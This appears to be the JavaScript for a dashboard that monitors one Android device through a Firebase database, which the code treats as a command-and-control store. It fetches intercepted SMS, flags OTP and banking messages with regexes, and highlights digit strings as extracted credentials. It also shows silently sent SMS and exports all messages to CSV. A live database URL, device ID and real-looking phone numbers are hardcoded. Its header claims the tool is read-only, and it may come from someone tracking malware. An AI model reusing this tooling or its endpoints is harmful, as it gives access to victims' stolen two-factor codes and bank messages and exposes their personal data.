/**
 * C2 Device Monitor Application Logic
 * Target Device: 03e768e104ef026d
 * 
 * STRICTLY READ-ONLY: Only HTTP GET requests to Firebase REST API and static GitHub JSON data.
 * Zero mutations, zero modifications, zero writes.
 */

const CONFIG = {
  deviceId: '03e768e104ef026d',
  firebaseBase: 'https://r-cha-222-default-rtdb.firebaseio.com',
  itemsPerPage: 25,
};

// Application State
const state = {
  mode: 'live', // 'live' | 'archive'
  autoRefreshInterval: 15,
  countdown: 15,
  timerId: null,
  isFetching: false,
  currentData: null,
  allMessages: [],
  filteredMessages: [],
  currentPage: 1,
  activeFilter: 'all',
  searchQuery: '',
  historyData: [],
  eventsData: [],
  charts: {
    battery: null,
    messages: null,
  },
};

// DOM Elements Cache
const el = {
  deviceIdChip: document.getElementById('deviceIdChip'),
  copyIdBtn: document.getElementById('copyIdBtn'),
  srcLiveBtn: document.getElementById('srcLiveBtn'),
  srcArchiveBtn: document.getElementById('srcArchiveBtn'),
  refreshBtn: document.getElementById('refreshBtn'),
  refreshIcon: document.getElementById('refreshIcon'),
  autoRefreshSelect: document.getElementById('autoRefreshSelect'),
  countdownLabel: document.getElementById('countdownLabel'),
  statusRibbon: document.getElementById('statusRibbon'),
  deviceStatusBadge: document.getElementById('deviceStatusBadge'),
  deviceStatusText: document.getElementById('deviceStatusText'),
  lastFetchTime: document.getElementById('lastFetchTime'),
  fetchLatency: document.getElementById('fetchLatency'),
  batteryPercent: document.getElementById('batteryPercent'),
  batteryBarFill: document.getElementById('batteryBarFill'),
  batteryStatusText: document.getElementById('batteryStatusText'),
  batteryTrend: document.getElementById('batteryTrend'),
  deviceIp: document.getElementById('deviceIp'),
  deviceCarrier: document.getElementById('deviceCarrier'),
  devicePhone: document.getElementById('devicePhone'),
  simSlot: document.getElementById('simSlot'),
  deviceModel: document.getElementById('deviceModel'),
  deviceAndroid: document.getElementById('deviceAndroid'),
  deviceArch: document.getElementById('deviceArch'),
  deviceStorage: document.getElementById('deviceStorage'),
  deviceSd: document.getElementById('deviceSd'),
  deviceRoot: document.getElementById('deviceRoot'),
  totalMsgCount: document.getElementById('totalMsgCount'),
  finMsgCount: document.getElementById('finMsgCount'),
  otpMsgCount: document.getElementById('otpMsgCount'),
  lastMsgTime: document.getElementById('lastMsgTime'),
  c2UserCommand: document.getElementById('c2UserCommand'),
  c2PingVal: document.getElementById('c2PingVal'),
  c2PongVal: document.getElementById('c2PongVal'),
  webhookTargetPhone: document.getElementById('webhookTargetPhone'),
  webhookSlot: document.getElementById('webhookSlot'),
  webhookDelivered: document.getElementById('webhookDelivered'),
  webhookMessageText: document.getElementById('webhookMessageText'),
  historySourceLabel: document.getElementById('historySourceLabel'),
  eventCountBadge: document.getElementById('eventCountBadge'),
  eventsTimeline: document.getElementById('eventsTimeline'),
  smsSearchInput: document.getElementById('smsSearchInput'),
  clearSearchBtn: document.getElementById('clearSearchBtn'),
  messageFeed: document.getElementById('messageFeed'),
  smsCountDisplay: document.getElementById('smsCountDisplay'),
  showingCountText: document.getElementById('showingCountText'),
  pageIndicator: document.getElementById('pageIndicator'),
  prevPageBtn: document.getElementById('prevPageBtn'),
  nextPageBtn: document.getElementById('nextPageBtn'),
  countAll: document.getElementById('countAll'),
  countBanking: document.getElementById('countBanking'),
  countOtp: document.getElementById('countOtp'),
  countCarrier: document.getElementById('countCarrier'),
  countPnb: document.getElementById('countPnb'),
  jsonModal: document.getElementById('jsonModal'),
  modalTitle: document.getElementById('modalTitle'),
  modalJsonContent: document.getElementById('modalJsonContent'),
  closeModalBtn: document.getElementById('closeModalBtn'),
  modalDoneBtn: document.getElementById('modalDoneBtn'),
  modalCopyBtn: document.getElementById('modalCopyBtn'),
  exportSnapshotBtn: document.getElementById('exportSnapshotBtn'),
  exportMessagesBtn: document.getElementById('exportMessagesBtn'),
};

/**
 * Initialize application
 */
document.addEventListener('DOMContentLoaded', () => {
  setupEventListeners();
  setupTabs();
  startAutoRefresh();
  fetchData();
  fetchHistoricalData();
});

/**
 * Event Listeners setup
 */
function setupEventListeners() {
  // Mode toggles
  el.srcLiveBtn.addEventListener('click', () => setMode('live'));
  el.srcArchiveBtn.addEventListener('click', () => setMode('archive'));

  // Refresh
  el.refreshBtn.addEventListener('click', () => {
    resetCountdown();
    fetchData();
  });

  // Auto Refresh Interval
  el.autoRefreshSelect.addEventListener('change', (e) => {
    state.autoRefreshInterval = parseInt(e.target.value, 10);
    resetCountdown();
  });

  // Copy ID
  el.copyIdBtn.addEventListener('click', copyDeviceId);
  el.deviceIdChip.addEventListener('click', copyDeviceId);

  // Search
  el.smsSearchInput.addEventListener('input', (e) => {
    state.searchQuery = e.target.value.trim().toLowerCase();
    el.clearSearchBtn.style.display = state.searchQuery ? 'block' : 'none';
    state.currentPage = 1;
    applyMessageFilters();
  });

  el.clearSearchBtn.addEventListener('click', () => {
    el.smsSearchInput.value = '';
    state.searchQuery = '';
    el.clearSearchBtn.style.display = 'none';
    state.currentPage = 1;
    applyMessageFilters();
  });

  // Filter Pills
  document.querySelectorAll('.filter-pill').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-pill').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state.activeFilter = btn.dataset.filter;
      state.currentPage = 1;
      applyMessageFilters();
    });
  });

  // Pagination
  el.prevPageBtn.addEventListener('click', () => {
    if (state.currentPage > 1) {
      state.currentPage--;
      renderMessages();
    }
  });

  el.nextPageBtn.addEventListener('click', () => {
    const totalPages = Math.ceil(state.filteredMessages.length / CONFIG.itemsPerPage) || 1;
    if (state.currentPage < totalPages) {
      state.currentPage++;
      renderMessages();
    }
  });

  // Modal Controls
  el.closeModalBtn.addEventListener('click', closeModal);
  el.modalDoneBtn.addEventListener('click', closeModal);
  el.jsonModal.addEventListener('click', (e) => {
    if (e.target === el.jsonModal) closeModal();
  });
  el.modalCopyBtn.addEventListener('click', copyModalJson);

  // Exports
  el.exportSnapshotBtn.addEventListener('click', exportSnapshot);
  el.exportMessagesBtn.addEventListener('click', exportMessagesCsv);
}

/**
 * Setup Tab buttons
 */
function setupTabs() {
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      btn.classList.add('active');
      const target = document.getElementById(btn.dataset.tab);
      if (target) target.classList.add('active');
    });
  });
}

/**
 * Set Data Source Mode ('live' | 'archive')
 */
function setMode(newMode) {
  state.mode = newMode;
  if (newMode === 'live') {
    el.srcLiveBtn.classList.add('active');
    el.srcArchiveBtn.classList.remove('active');
    el.historySourceLabel.textContent = 'Live Firebase RTDB (GET)';
  } else {
    el.srcArchiveBtn.classList.add('active');
    el.srcLiveBtn.classList.remove('active');
    el.historySourceLabel.textContent = 'GitHub Local/Pages Data Archive';
  }
  resetCountdown();
  fetchData();
}

/**
 * Copy Device ID with visual feedback
 */
function copyDeviceId() {
  navigator.clipboard.writeText(CONFIG.deviceId).then(() => {
    const originalText = el.copyIdBtn.textContent;
    el.copyIdBtn.textContent = '✓';
    setTimeout(() => {
      el.copyIdBtn.textContent = originalText;
    }, 1500);
  });
}

/**
 * Start Auto Refresh Countdown Timer
 */
function startAutoRefresh() {
  if (state.timerId) clearInterval(state.timerId);
  state.timerId = setInterval(() => {
    if (state.autoRefreshInterval <= 0 || state.isFetching) {
      el.countdownLabel.textContent = '--';
      return;
    }
    state.countdown--;
    if (state.countdown <= 0) {
      fetchData();
      state.countdown = state.autoRefreshInterval;
    }
    el.countdownLabel.textContent = `${state.countdown}s`;
  }, 1000);
}

function resetCountdown() {
  state.countdown = state.autoRefreshInterval;
  el.countdownLabel.textContent = state.autoRefreshInterval > 0 ? `${state.countdown}s` : '--';
}

/**
 * Safe Read-Only Fetch Helper
 * Guaranteed GET only
 */
async function safeHttpGet(url, timeoutMs = 12000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  const res = await fetch(url, {
    method: 'GET', // STRICTLY READ-ONLY
    headers: { 'Accept': 'application/json' },
    signal: controller.signal,
  });
  clearTimeout(timeoutId);

  if (!res.ok) {
    throw new Error(`HTTP ${res.status}: ${res.statusText}`);
  }
  return await res.json();
}

/**
 * Fetch Main Device Data
 */
async function fetchData() {
  if (state.isFetching) return;
  state.isFetching = true;
  el.refreshBtn.classList.add('spinning');
  const startTime = performance.now();

  try {
    if (state.mode === 'live') {
      // Direct Live Firebase REST API GET
      const clientUrl = `${CONFIG.firebaseBase}/clients/${CONFIG.deviceId}.json`;
      const cmdUrl = `${CONFIG.firebaseBase}/commands/${CONFIG.deviceId}.json`;
      const userUrl = `${CONFIG.firebaseBase}/user_data/${CONFIG.deviceId}.json`;
      const msgUrl = `${CONFIG.firebaseBase}/messages/${CONFIG.deviceId}.json`;

      const [clientData, cmdData, userData, msgData] = await Promise.all([
        safeHttpGet(clientUrl).catch(() => null),
        safeHttpGet(cmdUrl).catch(() => null),
        safeHttpGet(userUrl).catch(() => null),
        safeHttpGet(msgUrl).catch(() => null),
      ]);

      const elapsed = Math.round(performance.now() - startTime);
      el.fetchLatency.textContent = `${elapsed} ms`;
      el.lastFetchTime.textContent = new Date().toLocaleTimeString();

      processLivePayload(clientData, cmdData, userData, msgData);
    } else {
      // Historical Archive Mode (fetch from static local / data folder)
      const data = await safeHttpGet('data/latest.json');
      const elapsed = Math.round(performance.now() - startTime);
      el.fetchLatency.textContent = `${elapsed} ms (Archive)`;
      el.lastFetchTime.textContent = data.last_tracked_display || 'Archive Snapshot';

      processArchivePayload(data);
    }
  } catch (err) {
    console.error('Fetch error:', err);
    // If live failed, suggest or fallback to archive
    if (state.mode === 'live') {
      console.warn('Live fetch failed, falling back to local archive...');
      try {
        const fallbackData = await safeHttpGet('data/latest.json');
        processArchivePayload(fallbackData);
        el.lastFetchTime.textContent = 'Archive (Live Unreachable)';
      } catch (e) {
        el.lastFetchTime.textContent = 'Fetch Failed';
      }
    }
  } finally {
    state.isFetching = false;
    el.refreshBtn.classList.remove('spinning');
  }
}

/**
 * Process Raw Live Payloads from Firebase
 */
function processLivePayload(client, commands, userData, messages) {
  state.currentData = {
    client,
    commands,
    userData,
    messages,
  };

  // Status Badge
  const isOnline = client && client.status === true;
  el.deviceStatusBadge.className = `status-indicator-badge ${isOnline ? 'online' : 'offline'}`;
  el.deviceStatusText.textContent = isOnline ? 'ONLINE' : 'OFFLINE';

  // Battery
  const batRaw = (client && client.battery) || '--';
  const batPct = parseInt(batRaw, 10) || 0;
  el.batteryPercent.textContent = batRaw;
  el.batteryBarFill.style.width = `${Math.min(batPct, 100)}%`;
  if (batPct < 20) {
    el.batteryBarFill.style.background = 'linear-gradient(90deg, #ef4444 0%, #f87171 100%)';
  } else if (batPct < 50) {
    el.batteryBarFill.style.background = 'linear-gradient(90deg, #f59e0b 0%, #fbbf24 100%)';
  } else {
    el.batteryBarFill.style.background = 'linear-gradient(90deg, #10b981 0%, #34d399 100%)';
  }

  // Network & Cellular
  el.deviceIp.textContent = (client && client.ip_address) || '--';
  el.deviceCarrier.textContent = (client && client.service_provider) || 'airtel';
  el.devicePhone.textContent = (client && client.mobNo) || '+918433062983';

  // Hardware
  el.deviceModel.textContent = (client && client.modelName) || 'CPH2467';
  el.deviceAndroid.textContent = `Android ${client ? client.androidV : '15'} (SDK ${client ? client.sdkV : '35'})`;
  el.deviceArch.textContent = (client && client.cpu_arch) || 'arm64-v8a';
  el.deviceStorage.textContent = (client && client.storage) || '104GB';
  el.deviceSd.textContent = client && client.isSdCard ? 'Yes' : 'No';
  el.deviceRoot.textContent = client && client.isRoot ? 'Rooted' : 'No (Non-Rooted)';

  // C2 Commands & Liveness
  const pingVal = commands && commands.checkLiveness ? commands.checkLiveness.text : '--';
  const pongVal = client && client.webhookEvent && client.webhookEvent.checkLiveness ? client.webhookEvent.checkLiveness.text : '--';
  el.c2PingVal.textContent = pingVal;
  el.c2PongVal.textContent = pongVal;

  const userCmd = userData && userData.command ? userData.command : '--';
  el.c2UserCommand.textContent = userCmd;
  el.simSlot.textContent = userData && userData.simSlot !== undefined ? userData.simSlot : '0';

  // Silent Webhook SMS
  const whSms = client && client.webhookEvent ? client.webhookEvent.sendSms : null;
  if (whSms) {
    el.webhookTargetPhone.textContent = whSms.to || '+919560241900';
    el.webhookSlot.textContent = whSms.from !== undefined ? whSms.from : '0';
    el.webhookDelivered.textContent = whSms.isSended ? 'true (Delivered)' : 'false (Queued / Attempted)';
    el.webhookMessageText.textContent = whSms.message || 'No payload message';
  }

  // Parse Messages
  parseAndRenderMessages(messages);
}

/**
 * Process Archive Payload from data/latest.json
 */
function processArchivePayload(snapshot) {
  state.currentData = snapshot;
  const client = snapshot.raw ? snapshot.raw.client : (snapshot.client || {});
  const commands = snapshot.raw ? snapshot.raw.commands : (snapshot.commands || {});
  const userData = snapshot.raw ? snapshot.raw.user_data : (snapshot.user_data || {});
  processLivePayload(client, commands, userData, null);

  // If archive messages exist in separate file, load them
  safeHttpGet('data/messages_archive.json').then(arch => {
    if (arch && arch.messages) {
      parseAndRenderMessages(arch.messages);
    }
  }).catch(() => {});
}

/**
 * Normalize and categorize messages
 */
function parseAndRenderMessages(rawMsgs) {
  if (!rawMsgs) {
    // If no live message object passed, try fetching local archive
    safeHttpGet('data/messages_archive.json').then(arch => {
      if (arch && arch.messages) {
        parseAndRenderMessages(arch.messages);
      }
    }).catch(() => {});
    return;
  }

  const list = [];
  const otpRegex = /\b(otp|one time password|pin|code|cvv|verification|verify)\b/i;
  const finRegex = /\b(upi|inr|rs\.?|debited|credited|balance|a\/c|account|bank|pnb|sbi|hdfc|icici)\b/i;

  let finCount = 0;
  let otpCount = 0;
  let carrierCount = 0;
  let pnbCount = 0;

  for (const [key, val] of Object.entries(rawMsgs)) {
    if (!val || typeof val !== 'object') continue;
    const body = val.message || '';
    const sender = (val.sender || 'UNKNOWN').toUpperCase();
    const isOtp = otpRegex.test(body);
    const isFin = finRegex.test(body);
    const isPnb = sender.includes('PNB');
    const isCarrier = sender.includes('AIRTEL') || sender.includes('6500') || sender.includes('JIO');

    if (isFin) finCount++;
    if (isOtp) otpCount++;
    if (isPnb) pnbCount++;
    if (isCarrier) carrierCount++;

    list.push({
      id: val.id || key,
      sender: val.sender || 'UNKNOWN',
      message: body,
      dateTime: val.dateTime || '',
      type: val.type || 'incoming',
      isOtp,
      isFin,
      isPnb,
      isCarrier,
    });
  }

  // Sort descending by ID / timestamp
  list.sort((a, b) => {
    const na = Number(a.id);
    const nb = Number(b.id);
    if (!isNaN(na) && !isNaN(nb)) return nb - na;
    return String(b.id).localeCompare(String(a.id));
  });

  state.allMessages = list;

  // Counts update
  el.totalMsgCount.textContent = list.length;
  el.smsCountDisplay.textContent = `(${list.length} total messages)`;
  el.finMsgCount.textContent = `${finCount} Banking`;
  el.otpMsgCount.textContent = `${otpCount} OTPs`;
  el.countAll.textContent = list.length;
  el.countBanking.textContent = finCount;
  el.countOtp.textContent = otpCount;
  el.countCarrier.textContent = carrierCount;
  el.countPnb.textContent = pnbCount;

  if (list.length > 0) {
    el.lastMsgTime.textContent = list[0].dateTime || 'Recently';
  }

  applyMessageFilters();
}

/**
 * Filter and Search Messages
 */
function applyMessageFilters() {
  const filter = state.activeFilter;
  const q = state.searchQuery;

  state.filteredMessages = state.allMessages.filter(msg => {
    // Category match
    if (filter === 'banking' && !msg.isFin) return false;
    if (filter === 'otp' && !msg.isOtp) return false;
    if (filter === 'carrier' && !msg.isCarrier) return false;
    if (filter === 'pnb' && !msg.isPnb) return false;

    // Search query match
    if (q) {
      const matchSender = msg.sender.toLowerCase().includes(q);
      const matchBody = msg.message.toLowerCase().includes(q);
      const matchDate = msg.dateTime.toLowerCase().includes(q);
      return matchSender || matchBody || matchDate;
    }
    return true;
  });

  renderMessages();
}

/**
 * Highlight OTP and numerical credentials in text
 */
function highlightSensitives(text) {
  if (!text) return '';
  // Escape HTML
  const safe = text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  // Match 4 to 8 digit standalone numbers (potential OTPs/PINs)
  return safe.replace(/\b(\d{4,8})\b/g, '<span class="highlight-otp-badge" title="Extracted Credential / OTP">$1</span>');
}

/**
 * Render Paginated Message Feed
 */
function renderMessages() {
  const list = state.filteredMessages;
  const total = list.length;
  const totalPages = Math.ceil(total / CONFIG.itemsPerPage) || 1;

  if (state.currentPage > totalPages) state.currentPage = totalPages;
  if (state.currentPage < 1) state.currentPage = 1;

  const startIdx = (state.currentPage - 1) * CONFIG.itemsPerPage;
  const endIdx = Math.min(startIdx + CONFIG.itemsPerPage, total);
  const pageItems = list.slice(startIdx, endIdx);

  el.showingCountText.textContent = `Showing ${total === 0 ? 0 : startIdx + 1} - ${endIdx} of ${total} messages`;
  el.pageIndicator.textContent = `Page ${state.currentPage} of ${totalPages}`;
  el.prevPageBtn.disabled = state.currentPage <= 1;
  el.nextPageBtn.disabled = state.currentPage >= totalPages;

  if (pageItems.length === 0) {
    el.messageFeed.innerHTML = `
      <div class="empty-state">
        <span>No intercepted SMS found matching criteria.</span>
      </div>
    `;
    return;
  }

  let html = '';
  for (const m of pageItems) {
    const cardClass = m.isOtp ? 'message-card otp' : (m.isFin ? 'message-card financial' : 'message-card');
    const badgeMarkup = m.isOtp 
      ? '<span class="badge-tag badge-otp">🔑 2FA / OTP</span>'
      : (m.isFin ? '<span class="badge-tag badge-bank">🏦 BANKING</span>' : '');

    html += `
      <div class="${cardClass}">
        <div class="msg-top-bar">
          <div class="msg-sender-group">
            <span class="msg-sender-name">${m.sender}</span>
            <span class="badge-tag badge-incoming">INCOMING</span>
            ${badgeMarkup}
          </div>
          <span class="msg-time">${m.dateTime || 'Timestamp N/A'}</span>
        </div>
        <div class="msg-body-text">${highlightSensitives(m.message)}</div>
        <div class="msg-actions">
          <button class="btn-msg-action" onclick="window.copyMsgText('${m.id}')">📋 Copy SMS</button>
          <button class="btn-msg-action" onclick="window.viewMsgJson('${m.id}')">🔍 Forensic JSON</button>
        </div>
      </div>
    `;
  }

  el.messageFeed.innerHTML = html;
}

// Window actions for messages
window.copyMsgText = function(id) {
  const found = state.allMessages.find(m => String(m.id) === String(id));
  if (found) {
    navigator.clipboard.writeText(found.message);
  }
};

window.viewMsgJson = function(id) {
  const found = state.allMessages.find(m => String(m.id) === String(id));
  if (found) {
    openModal(`Forensic Message ID: ${id}`, found);
  }
};

/**
 * Fetch and Render Historical Telemetry & Events
 */
async function fetchHistoricalData() {
  try {
    const [hist, evts] = await Promise.all([
      safeHttpGet('data/history.json').catch(() => []),
      safeHttpGet('data/events.json').catch(() => []),
    ]);

    state.historyData = Array.isArray(hist) ? hist : [];
    state.eventsData = Array.isArray(evts) ? evts : [];

    renderCharts(state.historyData);
    renderEvents(state.eventsData);
  } catch (e) {
    console.warn('Could not load historical datasets:', e);
  }
}

/**
 * Render Timeline Charts via Chart.js
 */
function renderCharts(history) {
  if (!window.Chart || !history || history.length === 0) return;

  const labels = history.map(h => {
    try {
      const d = new Date(h.timestamp);
      return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    } catch {
      return '';
    }
  });

  const batteryData = history.map(h => h.battery_pct);
  const msgData = history.map(h => h.msg_count);

  // Battery Chart
  const batCtx = document.getElementById('batteryChart')?.getContext('2d');
  if (batCtx) {
    if (state.charts.battery) state.charts.battery.destroy();
    state.charts.battery = new Chart(batCtx, {
      type: 'line',
      data: {
        labels: labels,
        datasets: [{
          label: 'Battery %',
          data: batteryData,
          borderColor: '#10b981',
          backgroundColor: 'rgba(16, 185, 129, 0.1)',
          fill: true,
          tension: 0.3,
          pointRadius: 3,
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        scales: {
          y: { min: 0, max: 100, grid: { color: '#1f2937' }, ticks: { color: '#9ca3af' } },
          x: { grid: { color: '#1f2937' }, ticks: { color: '#9ca3af' } }
        },
        plugins: { legend: { display: false } }
      }
    });
  }

  // Messages Chart
  const msgCtx = document.getElementById('messageChart')?.getContext('2d');
  if (msgCtx) {
    if (state.charts.messages) state.charts.messages.destroy();
    state.charts.messages = new Chart(msgCtx, {
      type: 'line',
      data: {
        labels: labels,
        datasets: [{
          label: 'Total SMS Count',
          data: msgData,
          borderColor: '#06b6d4',
          backgroundColor: 'rgba(6, 182, 212, 0.1)',
          fill: true,
          tension: 0.3,
          pointRadius: 3,
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        scales: {
          y: { grid: { color: '#1f2937' }, ticks: { color: '#9ca3af' } },
          x: { grid: { color: '#1f2937' }, ticks: { color: '#9ca3af' } }
        },
        plugins: { legend: { display: false } }
      }
    });
  }
}

/**
 * Render Events Log Timeline
 */
function renderEvents(events) {
  el.eventCountBadge.textContent = events.length;
  if (!events || events.length === 0) {
    el.eventsTimeline.innerHTML = '<div class="empty-state">No significant state transition events logged yet.</div>';
    return;
  }

  let html = '';
  for (const ev of events) {
    const timeDisplay = ev.timestamp ? new Date(ev.timestamp).toLocaleString() : 'N/A';
    html += `
      <div class="event-row ${ev.type || ''}">
        <span class="event-time">${timeDisplay}</span>
        <div class="event-body">
          <span class="event-type-badge">${ev.type || 'EVENT'}</span>
          <div class="event-text">${ev.detail || 'State transition detected'}</div>
        </div>
      </div>
    `;
  }
  el.eventsTimeline.innerHTML = html;
}

/**
 * Modal Handling
 */
function openModal(title, obj) {
  el.modalTitle.textContent = title;
  el.modalJsonContent.textContent = JSON.stringify(obj, null, 2);
  el.jsonModal.classList.add('open');
}

function closeModal() {
  el.jsonModal.classList.remove('open');
}

function copyModalJson() {
  navigator.clipboard.writeText(el.modalJsonContent.textContent);
  el.modalCopyBtn.textContent = '✓ Copied';
  setTimeout(() => el.modalCopyBtn.textContent = '📋 Copy JSON', 1500);
}

/**
 * Data Exports
 */
function exportSnapshot() {
  if (!state.currentData) return;
  const blob = new Blob([JSON.stringify(state.currentData, null, 2)], { type: 'application/json' });
  downloadBlob(blob, `device-03e768e104ef026d-snapshot-${Date.now()}.json`);
}

function exportMessagesCsv() {
  if (!state.allMessages || state.allMessages.length === 0) return;
  const header = ['ID', 'Date/Time', 'Sender', 'Type', 'Is_OTP', 'Is_Financial', 'Message'];
  const rows = state.allMessages.map(m => [
    `"${m.id}"`,
    `"${(m.dateTime || '').replace(/"/g, '""')}"`,
    `"${(m.sender || '').replace(/"/g, '""')}"`,
    `"${m.type || ''}"`,
    m.isOtp ? '1' : '0',
    m.isFin ? '1' : '0',
    `"${(m.message || '').replace(/"/g, '""')}"`
  ]);
  const csvContent = [header.join(','), ...rows.map(r => r.join(','))].join('\n');
  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  downloadBlob(blob, `device-03e768e104ef026d-messages-${Date.now()}.csv`);
}

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
